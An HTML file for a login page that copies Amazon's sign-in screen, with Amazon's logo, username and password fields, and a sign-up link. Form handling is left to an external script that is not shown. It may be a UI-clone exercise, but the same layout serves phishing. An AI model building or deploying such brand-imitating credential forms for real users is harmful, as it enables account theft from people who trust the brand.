<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Login</title>
    <link rel="stylesheet" href="Login.css">
</head>

<body>
<div class="container">
    <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Amazon_logo.svg/1024px-Amazon_logo.svg.png" alt="Amazon Logo">
    </div>
    <h2>Sign-In</h2>
    <form id="login-form">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Login</button>
    </form>
    <div class="signup">
        <p>New to Amazon? <a id="signup-link" href="#">Create your Amazon account</a></p>
    </div>
    <div id="message"></div>
    <script src="script.js"></script>
</div>
</body>

</html>
